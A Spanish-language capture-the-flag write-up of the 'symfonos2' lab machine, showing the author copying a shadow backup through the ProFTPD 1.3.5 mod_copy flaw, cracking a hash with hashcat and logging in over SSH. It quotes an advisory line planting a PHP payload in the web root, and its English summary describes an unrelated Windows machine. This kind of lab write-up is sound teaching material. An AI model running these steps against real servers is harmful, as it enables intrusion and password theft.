---
layout: single
title: symfonos2 - Hack The Box
excerpt: "comencé con un escaneo y encontré un log en SMB que me dio pistas. Luego, vi que el servidor tenía ProFTPD 1.3.5, así que abusé de la funcionalidad de copiar y pegar archivos dentro del FTP. Ahí encontré un script .ash con credenciales, lo que me permitió conectarme al sistema. Una vez dentro, descubrí un puerto interno que no era accesible desde el exterior. Hice port forwarding para exponerlo y terminé encontrando una página vulnerable. A partir de ahí, exploté la vulnerabilidad y conseguí acceso total a la máquina"
date: 2020-04-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-symfonos2/symfonos2.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - smb
  - ftp
  - hashcat
  - escalada de privilegios
---

![](/assets/images/htb-writeup-symfonos2/symfonos2.png)

comencé con un escaneo y encontré un log en SMB que me dio pistas. Luego, vi que el servidor tenía ProFTPD 1.3.5, así que abusé de la funcionalidad de copiar y pegar archivos dentro del FTP. Ahí encontré un script .ash con credenciales, lo que me permitió conectarme al sistema. Una vez dentro, descubrí un puerto interno que no era accesible desde el exterior. Hice port forwarding para exponerlo y terminé encontrando una página vulnerable. A partir de ahí, exploté la vulnerabilidad y conseguí acceso total a la máquina

## Summary

- There's an SQL injection in a PHP page of the main web application that leads to writing a webshell
- After getting an initial shell, we find additonal credentials by checking the MySQL database
- Using the user Hector, we find that some of the registry entries for some services are writable by user Hector
- By replacing the configuration of the SecLogon service, we can get RCE as SYSTEM

## Portscan

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ sudo nmap -p- --open -sCV 192.168.1.73                    
   3   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 09:04 UTC
   4   │ Nmap scan report for 192.168.1.73
   5   │ Host is up (0.00012s latency).
   6   │ Not shown: 65530 closed tcp ports (reset)
   7   │ PORT    STATE SERVICE     VERSION
   8   │ 21/tcp  open  ftp         ProFTPD 1.3.5
   9   │ 22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  10   │ | ssh-hostkey: 
  11   │ |   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
  12   │ |   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
  13   │ |_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
  14   │ 80/tcp  open  http        WebFS httpd 1.21
  15   │ |_http-server-header: webfs/1.21
  16   │ |_http-title: Site doesn't have a title (text/html).
  17   │ 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  18   │ 445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
  19   │ MAC Address: 08:00:27:36:A8:4C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
  20   │ Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  21   │ 
  22   │ Host script results:
  23   │ | smb-os-discovery: 
  24   │ |   OS: Windows 6.1 (Samba 4.5.16-Debian)
  25   │ |   Computer name: symfonos2
  26   │ |   NetBIOS computer name: SYMFONOS2\x00
  27   │ |   Domain name: \x00
  28   │ |   FQDN: symfonos2
  29   │ |_  System time: 2025-02-18T03:05:39-06:00
  30   │ |_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  31   │ | smb-security-mode: 
  32   │ |   account_used: guest
  33   │ |   authentication_level: user
  34   │ |   challenge_response: supported
  35   │ |_  message_signing: disabled (dangerous, but default)
  36   │ |_clock-skew: mean: 2h00m42s, deviation: 3h27m50s, median: 42s
  37   │ | smb2-time: 
  38   │ |   date: 2025-02-18T09:05:39
  39   │ |_  start_date: N/A
  40   │ | smb2-security-mode: 
  41   │ |   3:1:1: 
  42   │ |_    Message signing enabled but not required
  43   │ 
  44   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  45   │ Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
```

vemos que tiene el puertos smb abierto chemos aver que hay

`smbclient -L 192.168.1.70 -N`


```
  17   │ ┌──(noesholk㉿noes)-[~]
  18   │ └─$ smbclient //192.168.1.73/anonymous -N                                                                              
       │          
  19   │ Try "help" to get a list of possible commands.
  20   │ smb: \>
```

con smbclient descrago un archivo log


```
   1   │ root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
   2   │ root@symfonos2:~# cat /etc/samba/smb.conf
   3   │ #
   4   │ # Sample configuration file for the Samba suite for Debian GNU/Linux.
   5   │ #
   6   │ #
   7   │ # This is the main Samba configuration file. You should read the
   8   │ # smb.conf(5) manual page in order to understand the options listed
   9   │ # here. Samba has a huge number of configurable options most of which 
  10   │ # are not shown in this example
  11   │ #
  12   │ # Some options that are often worth tuning have been included as
  13   │ # commented-out examples in this file.
  14   │ #  - When such options are commented with ";", the proposed setting
  15   │ #    differs from the default Samba behaviour
  16   │ #  - When commented with "#", the proposed setting is the default
  17   │ #    behaviour of Samba but the option is considered important
  18   │ #    enough to be mentioned here
  19   │ #
  20   │ # NOTE: Whenever you modify this file you should run the command
  21   │ # "testparm" to check that you have not made any basic syntactic 
  22   │ # errors. 
  23   │ 
  24   │ #======================= Global Settings =======================
  25   │ 
  26   │ [global]
  27   │ 
  28   │ ## Browsing/Identification ###
  29   │ 
  30   │ # Change this to the workgroup/NT-domain name your Samba server will part of
  31   │    workgroup = WORKGROUP
  32   │ 
  33   │ # Windows Internet Name Serving Support Section:
  34   │ # WINS Support - Tells the NMBD component of Samba to enable its WINS Server
  35   │ #   wins support = no
  36   │ 
  37   │ # WINS Server - Tells the NMBD components of Samba to be a WINS Client
  38   │ # Note: Samba can be either a WINS Server, or a WINS Client, but NOT both
  39   │ ;   wins server = w.x.y.z
  40   │ 
  41   │ # This will prevent nmbd to search for NetBIOS names through DNS.
  42   │    dns proxy = no
  43   │ 
  44   │ #### Networking ####
  45   │ 
  46   │ # The specific set of interfaces / networks to bind to
  47   │ # This can be either the interface name or an IP address/netmask;
  48   │ # interface names are normally preferred
  49   │ ;   interfaces = 127.0.0.0/8 eth0
  50   │ 
  51   │ # Only bind to the named interfaces and/or networks; you must use the
  52   │ # 'interfaces' option above to use this.
  53   │ # It is recommended that you enable this feature if your Samba machine is
  54   │ # not protected by a firewall or is a firewall itself.  However, this
  55   │ # option cannot handle dynamic or non-broadcast interfaces correctly.
  56   │ ;   bind interfaces only = yes
  57   │ 
  58   │ 
  59   │ 
  60   │ #### Debugging/Accounting ####
  61   │ 
  62   │ # This tells Samba to use a separate log file for each machine
  63   │ # that connects
  64   │    log file = /var/log/samba/log.%m
  65   │ 
  66   │ # Cap the size of the individual log files (in KiB).
  67   │    max log size = 1000
  68   │ 
  69   │ # If you want Samba to only log through syslog then set the following
  70   │ # parameter to 'yes'.
  71   │ #   syslog only = no
  72   │ 
  73   │ # We want Samba to log a minimum amount of information to syslog. Everything
  74   │ # should go to /var/log/samba/log.{smbd,nmbd} instead. If you want to log
  75   │ # through syslog you should set the following parameter to something higher.
  76   │    syslog = 0
  77   │ 
  78   │ # Do something sensible when Samba crashes: mail the admin a backtrace
  79   │    panic action = /usr/share/samba/panic-action %d
  80   │ 
  81   │ 
  82   │ ####### Authentication #######
  83   │ 
  84   │ # Server role. Defines in which mode Samba will operate. Possible
  85   │ # values are "standalone server", "member server", "classic primary
  86   │ # domain controller", "classic backup domain controller", "active
  87   │ # directory domain controller". 
  88   │ #
  89   │ # Most people will want "standalone sever" or "member server".
  90   │ # Running as "active directory domain controller" will require first
  91   │ # running "samba-tool domain provision" to wipe databases and create a
  92   │ # new domain.
  93   │    server role = standalone server
  94   │ 
  95   │ # If you are using encrypted passwords, Samba will need to know what
  96   │ # password database type you are using.  
  97   │    passdb backend = tdbsam
  98   │ 
  99   │    obey pam restrictions = yes
 100   │ 
 101   │ # This boolean parameter controls whether Samba attempts to sync the Unix
 102   │ # password with the SMB password when the encrypted SMB password in the
 103   │ # passdb is changed.
 104   │    unix password sync = yes
 105   │ 
 106   │ # For Unix password sync to work on a Debian GNU/Linux system, the following
 107   │ # parameters must be set (thanks to Ian Kahan <<kahan@informatik.tu-muenchen.de> for
 108   │ # sending the correct chat script for the passwd program in Debian Sarge).
 109   │    passwd program = /usr/bin/passwd %u
 110   │    passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
 111   │ 
 112   │ # This boolean controls whether PAM will be used for password changes
 113   │ # when requested by an SMB client instead of the program listed in
 114   │ # 'passwd program'. The default is 'no'.
 115   │    pam password change = yes
 116   │ 
 117   │ # This option controls how unsuccessful authentication attempts are mapped
 118   │ # to anonymous connections
 119   │    map to guest = bad user
 120   │ 
 121   │ ########## Domains ###########
 122   │ 
 123   │ #
 124   │ # The following settings only takes effect if 'server role = primary
 125   │ # classic domain controller', 'server role = backup domain controller'
 126   │ # or 'domain logons' is set 
 127   │ #
 128   │ 
 129   │ # It specifies the location of the user's
 130   │ # profile directory from the client point of view) The following
 131   │ # required a [profiles] share to be setup on the samba server (see
 132   │ # below)
 133   │ ;   logon path = \\%N\profiles\%U
 134   │ # Another common choice is storing the profile in the user's home directory
 135   │ # (this is Samba's default)
 136   │ #   logon path = \\%N\%U\profile
 137   │ 
 138   │ # The following setting only takes effect if 'domain logons' is set
 139   │ # It specifies the location of a user's home directory (from the client
 140   │ # point of view)
 141   │ ;   logon drive = H:
 142   │ #   logon home = \\%N\%U
 143   │ 
 144   │ # The following setting only takes effect if 'domain logons' is set
 145   │ # It specifies the script to run during logon. The script must be stored
 146   │ # in the [netlogon] share
 147   │ # NOTE: Must be store in 'DOS' file format convention
 148   │ ;   logon script = logon.cmd
 149   │ 
 150   │ # This allows Unix users to be created on the domain controller via the SAMR
 151   │ # RPC pipe.  The example command creates a user account with a disabled Unix
 152   │ # password; please adapt to your needs
 153   │ ; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos "" %u
 154   │ 
 155   │ # This allows machine accounts to be created on the domain controller via the 
 156   │ # SAMR RPC pipe.  
 157   │ # The following assumes a "machines" group exists on the system
 158   │ ; add machine script  = /usr/sbin/useradd -g machines -c "%u machine account" -d /var/lib/samba -s /bin/false %u
 159   │ 
 160   │ # This allows Unix groups to be created on the domain controller via the SAMR
 161   │ # RPC pipe.  
 162   │ ; add group script = /usr/sbin/addgroup --force-badname %g
 163   │ 
 164   │ ############ Misc ############
 165   │ 
 166   │ # Using the following line enables you to customise your configuration
 167   │ # on a per machine basis. The %m gets replaced with the netbios name
 168   │ # of the machine that is connecting
 169   │ ;   include = /home/samba/etc/smb.conf.%m
 170   │ 
 171   │ # Some defaults for winbind (make sure you're not using the ranges
 172   │ # for something else.)
 173   │ ;   idmap uid = 10000-20000
 174   │ ;   idmap gid = 10000-20000
 175   │ ;   template shell = /bin/bash
 176   │ 
 177   │ # Setup usershare options to enable non-root users to share folders
 178   │ # with the net usershare command.
 179   │ 
 180   │ # Maximum number of usershare. 0 (default) means that usershare is disabled.
 181   │ ;   usershare max shares = 100
 182   │ 
 183   │ # Allow users who've been granted usershare privileges to create
 184   │ # public shares, not just authenticated ones
 185   │    usershare allow guests = yes
 186   │ 
 187   │ #======================= Share Definitions =======================
 188   │ 
 189   │ [homes]
 190   │    comment = Home Directories
 191   │    browseable = no
 192   │ 
 193   │ # By default, the home directories are exported read-only. Change the
 194   │ # next parameter to 'no' if you want to be able to write to them.
 195   │    read only = yes
 196   │ 
 197   │ # File creation mask is set to 0700 for security reasons. If you want to
 198   │ # create files with group=rw permissions, set next parameter to 0775.
 199   │    create mask = 0700
 200   │ 
 201   │ # Directory creation mask is set to 0700 for security reasons. If you want to
 202   │ # create dirs. with group=rw permissions, set next parameter to 0775.
 203   │    directory mask = 0700
 204   │ 
 205   │ # By default, \\server\username shares can be connected to by anyone
 206   │ # with access to the samba server.
 207   │ # The following parameter makes sure that only "username" can connect
 208   │ # to \\server\username
 209   │ # This might need tweaking when using external authentication schemes
 210   │    valid users = %S
 211   │ 
 212   │ # Un-comment the following and create the netlogon directory for Domain Logons
 213   │ # (you need to configure Samba to act as a domain controller too.)
 214   │ ;[netlogon]
 215   │ ;   comment = Network Logon Service
 216   │ ;   path = /home/samba/netlogon
 217   │ ;   guest ok = yes
 218   │ ;   read only = yes
 219   │ 
 220   │ # Un-comment the following and create the profiles directory to store
 221   │ # users profiles (see the "logon path" option above)
 222   │ # (you need to configure Samba to act as a domain controller too.)
 223   │ # The path below should be writable by all users so that their
 224   │ # profile directory may be created the first time they log on
 225   │ ;[profiles]
 226   │ ;   comment = Users profiles
 227   │ ;   path = /home/samba/profiles
 228   │ ;   guest ok = no
 229   │ ;   browseable = no
 230   │ ;   create mask = 0600
 231   │ ;   directory mask = 0700
 232   │ 
 233   │ [printers]
 234   │    comment = All Printers
 235   │    browseable = no
 236   │    path = /var/spool/samba
 237   │    printable = yes
 238   │    guest ok = no
 239   │    read only = yes
 240   │    create mask = 0700
 241   │ 
 242   │ # Windows clients look for this share name as a source of downloadable
 243   │ # printer drivers
 244   │ [print$]
 245   │    comment = Printer Drivers
 246   │    path = /var/lib/samba/printers
 247   │    browseable = yes
 248   │    read only = yes
 249   │    guest ok = no
 250   │ # Uncomment to allow remote administration of Windows print drivers.
 251   │ # You may need to replace 'lpadmin' with the name of the group your
 252   │ # admin users are members of.
 253   │ # Please note that you also need to set appropriate Unix permissions
 254   │ # to the drivers directory for these users to have write rights in it
 255   │ ;   write list = root, @lpadmin
 256   │ 
 257   │ [anonymous]
 258   │    path = /home/aeolus/share
 259   │    browseable = yes
 260   │    read only = yes
 261   │    guest ok = yes
 262   │ 
 263   │ root@symfonos2:~# cat /usr/local/etc/proftpd.conf
 264   │ # This is a basic ProFTPD configuration file (rename it to 
 265   │ # 'proftpd.conf' for actual use.  It establishes a single server
 266   │ # and a single anonymous login.  It assumes that you have a user/group
 267   │ # "nobody" and "ftp" for normal operation and anon.
 268   │ 
 269   │ ServerName          "ProFTPD Default Installation"
 270   │ ServerType          standalone
 271   │ DefaultServer           on
 272   │ 
 273   │ # Port 21 is the standard FTP port.
 274   │ Port                21
 275   │ 
 276   │ # Don't use IPv6 support by default.
 277   │ UseIPv6             off
 278   │ 
 279   │ # Umask 022 is a good standard umask to prevent new dirs and files
 280   │ # from being group and world writable.
 281   │ Umask               022
 282   │ 
 283   │ # To prevent DoS attacks, set the maximum number of child processes
 284   │ # to 30.  If you need to allow more than 30 concurrent connections
 285   │ # at once, simply increase this value.  Note that this ONLY works
 286   │ # in standalone mode, in inetd mode you should use an inetd server
 287   │ # that allows you to limit maximum number of processes per service
 288   │ # (such as xinetd).
 289   │ MaxInstances            30
 290   │ 
 291   │ # Set the user and group under which the server will run.
 292   │ User                aeolus
 293   │ Group               aeolus
 294   │ 
 295   │ # To cause every FTP user to be "jailed" (chrooted) into their home
 296   │ # directory, uncomment this line.
 297   │ #DefaultRoot ~
 298   │ 
 299   │ # Normally, we want files to be overwriteable.
 300   │ AllowOverwrite      on
 301   │ 
 302   │ # Bar use of SITE CHMOD by default
 303   │ <Limit SITE_CHMOD>
 304   │   DenyAll
 305   │ </Limit>
 306   │ 
 307   │ # A basic anonymous configuration, no upload directories.  If you do not
 308   │ # want anonymous users, simply delete this entire <Anonymous> section.
 309   │ <Anonymous ~ftp>
 310   │   User              ftp
 311   │   Group             ftp
 312   │ 
 313   │   # We want clients to be able to login with "anonymous" as well as "ftp"
 314   │   UserAlias         anonymous ftp
 315   │ 
 316   │   # Limit the maximum number of anonymous logins
 317   │   MaxClients            10
 318   │ 
 319   │   # We want 'welcome.msg' displayed at login, and '.message' displayed
 320   │   # in each newly chdired directory.
 321   │   #DisplayLogin         welcome.msg
 322   │   #DisplayChdir         .message
 323   │ 
 324   │   # Limit WRITE everywhere in the anonymous chroot
 325   │   <Limit WRITE>
 326   │     DenyAll
 327   │   </Limit>
 328   │ </Anonymous>
```

parece que en el archivo log hay buena informacion de como entra a la maquina

root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak

el root esta cinedo un cat a /etc/shadow significa que si vemos que podemos ver el contenido de /etc/shadow en /var/backups/shadow.bak
y eso nos cae muy bien ya que el path de anonimous esta con


```
 257   │ [anonymous]
 258   │    path = /home/aeolus/share
 259   │    browseable = yes
 260   │    read only = yes
 261   │    guest ok = yes
```


y viendo que el puerto 21 es vilnerable podemos copiar y pegar archivos

```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ searchsploit ProFTPD 1.3.5            
   3   │ -----------------------------------------------------------------------------------------------------------------------
       │ -------------- ---------------------------------
   4   │  Exploit Title                                                                                                         
       │               |  Path
   5   │ -----------------------------------------------------------------------------------------------------------------------
       │ -------------- ---------------------------------
   6   │ ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                              
       │               | linux/remote/37262.rb
   7   │ ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                    
       │               | linux/remote/36803.py
   8   │ ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                
       │               | linux/remote/49908.py
   9   │ ProFTPd 1.3.5 - File Copy                                                                                              
       │               | linux/remote/36742.txt
```


ahora vemos el txt del searchsploit y vemos como es que se ejecuta es muy facil solo es copiar el shadow.bak ya que el root hico cat ai

```
  13   │ ┌──(noesholk㉿noes)-[~]
  14   │ └─$ searchsploit -x linux/remote/36742.txt
  15   │                                                                                                                        
       │                                                 
  16   │ ┌──(noesholk㉿noes)-[~]
  17   │ └─$ cat 36742.txt             
  18   │ Description TJ Saunders 2015-04-07 16:35:03 UTC
  19   │ Vadim Melihow reported a critical issue with proftpd installations that use the
  20   │ mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
  21   │ to be used by *unauthenticated clients*:
  22   │ 
  23   │ ---------------------------------
  24   │ Trying 80.150.216.115...
  25   │ Connected to 80.150.216.115.
  26   │ Escape character is '^]'.
  27   │ 220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]
  28   │ site help
  29   │ 214-The following SITE commands are recognized (* =>'s unimplemented)
  30   │ 214-CPFR <sp> pathname
  31   │ 214-CPTO <sp> pathname
  32   │ 214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
  33   │ 214-SYMLINK <sp> source <sp> destination
  34   │ 214-RMDIR <sp> path
  35   │ 214-MKDIR <sp> path
  36   │ 214-The following SITE extensions are recognized:
  37   │ 214-RATIO -- show all ratios in effect
  38   │ 214-QUOTA
  39   │ 214-HELP
  40   │ 214-CHGRP
  41   │ 214-CHMOD
  42   │ 214 Direct comments to root@www01a
  43   │ site cpfr /etc/passwd
  44   │ 350 File or directory exists, ready for destination name
  45   │ site cpto /tmp/passwd.copy
  46   │ 250 Copy successful
  47   │ -----------------------------------------
  48   │ 
  49   │ He provides another, scarier example:
  50   │ 
  51   │ ------------------------------
  52   │ site cpfr /etc/passwd
  53   │ 350 File or directory exists, ready for destination name
  54   │ site cpto <?php phpinfo(); ?>
  55   │ 550 cpto: Permission denied
  56   │ site cpfr /proc/self/fd/3
  57   │ 350 File or directory exists, ready for destination name
  58   │ site cpto /var/www/test.php
```

en nuestro caso sera el shadow.bak
y destino home/aeolus/share

- site cpfr /etc/passwd
- site cpto /var/www/test.php


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ftp 192.168.1.73
   3   │ Connected to 192.168.1.73.
   4   │ 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.73]
   5   │ Name (192.168.1.73:noesholk): anonymous
   6   │ 331 Anonymous login ok, send your complete email address as your password
   7   │ Password: 
   8   │ 530 Login incorrect.
   9   │ ftp: Login failed
  10   │ ftp> site cpfr /var/backups/shadow.bak
  11   │ 350 File or directory exists, ready for destination name
  12   │ ftp> site cpto /home/aeolus/share/shadow.bak
  13   │ 250 Copy successful
  14   │ ftp> 
  15   │ zsh: suspended  ftp 192.168.1.73
  16   │                                                                                                                        
       │              
  17   │ ┌──(noesholk㉿noes)-[~]
  18   │ └─$ smbclient //192.168.1.73/anonymous -N                                                                              
       │          
  19   │ Try "help" to get a list of possible commands.
  20   │ smb: \> sie
  21   │ sie: command not found
  22   │ smb: \> dir
  23   │   .                                   D        0  Tue Feb 18 21:48:36 2025
  24   │   ..                                  D        0  Thu Jul 18 14:29:08 2019
  25   │   backups                             D        0  Thu Jul 18 14:25:17 2019
  26   │   shadow.bak                          N     1173  Tue Feb 18 21:48:37 2025
  27   │ 
  28   │                 19728000 blocks of size 1024. 16313544 blocks available
  29   │ smb: \> get shadow.bak
  30   │ getting file \shadow.bak of size 1173 as shadow.bak (190.9 KiloBytes/sec) (average 190.9 KiloBytes/sec)
  31   │ smb: \>
```

ya despues de descargarlo veremos que tenia

```
   1   │ root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7
       │ :::
   2   │ daemon:*:18095:0:99999:7:::
   3   │ bin:*:18095:0:99999:7:::
   4   │ sys:*:18095:0:99999:7:::
   5   │ sync:*:18095:0:99999:7:::
   6   │ games:*:18095:0:99999:7:::
   7   │ man:*:18095:0:99999:7:::
   8   │ lp:*:18095:0:99999:7:::
   9   │ mail:*:18095:0:99999:7:::
  10   │ news:*:18095:0:99999:7:::
  11   │ uucp:*:18095:0:99999:7:::
  12   │ proxy:*:18095:0:99999:7:::
  13   │ www-data:*:18095:0:99999:7:::
  14   │ backup:*:18095:0:99999:7:::
  15   │ list:*:18095:0:99999:7:::
  16   │ irc:*:18095:0:99999:7:::
  17   │ gnats:*:18095:0:99999:7:::
  18   │ nobody:*:18095:0:99999:7:::
  19   │ systemd-timesync:*:18095:0:99999:7:::
  20   │ systemd-network:*:18095:0:99999:7:::
  21   │ systemd-resolve:*:18095:0:99999:7:::
  22   │ systemd-bus-proxy:*:18095:0:99999:7:::
  23   │ _apt:*:18095:0:99999:7:::
  24   │ Debian-exim:!:18095:0:99999:7:::
  25   │ messagebus:*:18095:0:99999:7:::
  26   │ sshd:*:18095:0:99999:7:::
  27   │ aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999
       │ :7:::
  28   │ cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999
       │ :7:::
  29   │ mysql:!:18095:0:99999:7:::
  30   │ Debian-snmp:!:18095:0:99999:7:::
  31   │ librenms:!:18095::::::
```


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ hashcat hash /usr/share/wordlists/rockyou.txt              
   3   │ hashcat (v6.2.6) starting in autodetect mode
   4   │ 
   5   │ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform 
       │ #1 [The pocl project]
   6   │ =======================================================================================================================
       │ =====================
   7   │ * Device #1: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 3157/6379 MB (1024 MB allocatable), 1MCU
   8   │ 
   9   │ Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
  10   │ The following mode was auto-detected as the only one matching your input hash:
  11   │ 
  12   │ 1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
  13   │ 
  14   │ NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
  15   │ Do NOT report auto-detect issues unless you are certain of the hash type.
  16   │ 
  17   │ Minimum password length supported by kernel: 0
  18   │ Maximum password length supported by kernel: 256
  19   │ 
  20   │ Hashes: 1 digests; 1 unique digests, 1 unique salts
  21   │ Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
  22   │ Rules: 1
  23   │ 
  24   │ Optimizers applied:
  25   │ * Zero-Byte
  26   │ * Single-Hash
  27   │ * Single-Salt
  28   │ * Uses-64-Bit
  29   │ 
  30   │ ATTENTION! Pure (unoptimized) backend kernels selected.
  31   │ Pure kernels can crack longer passwords, but drastically reduce performance.
  32   │ If you want to switch to optimized kernels, append -O to your commandline.
  33   │ See the above message to find out about the exact limits.
  34   │ 
  35   │ Watchdog: Temperature abort trigger set to 90c
  36   │ 
  37   │ Host memory required for this attack: 0 MB
  38   │ 
  39   │ Dictionary cache hit:
  40   │ * Filename..: /usr/share/wordlists/rockyou.txt
  41   │ * Passwords.: 14344385
  42   │ * Bytes.....: 139921507
  43   │ * Keyspace..: 14344385
  44   │ 
  45   │ Cracking performance lower than expected?                 
  46   │ 
  47   │ * Append -O to the commandline.
  48   │   This lowers the maximum supported password/salt length (usually down to 32).
  49   │ 
  50   │ * Append -w 3 to the commandline.
  51   │   This can cause your screen to lag.
  52   │ 
  53   │ * Append -S to the commandline.
  54   │   This has a drastic speed impact but can be better for specific attacks.
  55   │   Typical scenarios are a small wordlist but a large ruleset.
  56   │ 
  57   │ * Update your backend API runtime / driver the right way:
  58   │   https://hashcat.net/faq/wrongdriver
  59   │ 
  60   │ * Create more work items to make use of your parallelization power:
  61   │   https://hashcat.net/faq/morework
  62   │ 
  63   │ $6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
  64   │                                                           
  65   │ Session..........: hashcat
  66   │ Status...........: Cracked
  67   │ Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
  68   │ Hash.Target......: $6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBo...PlmLG.
  69   │ Time.Started.....: Tue Feb 18 22:43:56 2025 (1 min, 22 secs)
  70   │ Time.Estimated...: Tue Feb 18 22:45:18 2025 (0 secs)
  71   │ Kernel.Feature...: Pure Kernel
  72   │ Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
  73   │ Guess.Queue......: 1/1 (100.00%)
  74   │ Speed.#1.........:      308 H/s (10.00ms) @ Accel:64 Loops:256 Thr:1 Vec:4
  75   │ Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
  76   │ Progress.........: 25088/14344385 (0.17%)
  77   │ Rejected.........: 0/25088 (0.00%)
  78   │ Restore.Point....: 25024/14344385 (0.17%)
  79   │ Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
  80   │ Candidate.Engine.: Device Generator
  81   │ Candidates.#1....: 020284 -> sassy13
  82   │ Hardware.Mon.#1..: Util:100%
  83   │ 
  84   │ Started: Tue Feb 18 22:42:28 2025
  85   │ Stopped: Tue Feb 18 22:45:19 2025
```

no se los niego algo estraña la contraseña xd la contraseña ai esta no hare mencion pero bueno. igual si tengo novia me le declarare hace haciendo
una maquina auque bueno soy hacker los hackers no tienen tiempo para novia verdad?


```
   1   │ ┌──(noesholk㉿noes)-[~]
   2   │ └─$ ssh -L 8080:127.0.0.1:8080 aeolus@192.168.1.73
   3   │ aeolus@192.168.1.73's password: 
   4   │ Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
   5   │ 
   6   │ The programs included with the Debian GNU/Linux system are free software;
   7   │ the exact distribution terms for each program are described in the
   8   │ individual files in /usr/share/doc/*/copyright.
   9   │ 
  10   │ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  11   │ permitted by applicable law.
  12   │ Last login: Tue Feb 18 17:32:39 2025 from 192.168.1.72
  13   │ aeolus@symfonos2:~$ sergioteamosergioteamosergioteamo^C
  14   │ aeolus@symfonos2:~$ ^C
  15   │ aeolus@symfonos2:~$ ps aux
  16   │ USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
  17   │ root         1  0.0  0.8 138948  6816 ?        Ss   Feb18   0:00 /sbin/init
  18   │ root         2  0.0  0.0      0     0 ?        S    Feb18   0:00 [kthreadd]
  19   │ root         3  0.0  0.0      0     0 ?        S    Feb18   0:04 [ksoftirqd/0]
  20   │ root         5  0.0  0.0      0     0 ?        S<   Feb18   0:00 [kworker/0:0H]
  21   │ root         7  0.0  0.0      0     0 ?        S    Feb18   0:01 [rcu_sched]
  22   │ root         8  0.0  0.0      0     0 ?        S    Feb18   0:00 [rcu_bh]
  23   │ root         9  0.0  0.0      0     0 ?        S    Feb18   0:00 [migration/0]
  24   │ root        10  0.0  0.0      0     0 ?        S<   Feb18   0:00 [lru-add-drain]
  25   │ root        11  0.0  0.0      0     0 ?        S    Feb18   0:00 [watchdog/0]
  26   │ root        12  0.0  0.0      0     0 ?        S    Feb18   0:00 [cpuhp/0]
  27   │ root        13  0.0  0.0      0     0 ?        S    Feb18   0:00 [kdevtmpfs]
  28   │ root        14  0.0  0.0      0     0 ?        S<   Feb18   0:00 [netns]
  29   │ root        15  0.0  0.0      0     0 ?        S    Feb18   0:00 [khungtaskd]
  30   │ root        16  0.0  0.0      0     0 ?        S    Feb18   0:00 [oom_reaper]
  31   │ root        17  0.0  0.0      0     0 ?        S<   Feb18   0:00 [writeback]
  32   │ root        18  0.0  0.0      0     0 ?        S    Feb18   0:00 [kcompactd0]
  33   │ root        19  0.0  0.0      0     0 ?        SN   Feb18   0:00 [ksmd]
  34   │ root        21  0.0  0.0      0     0 ?        SN   Feb18   0:00 [khugepaged]
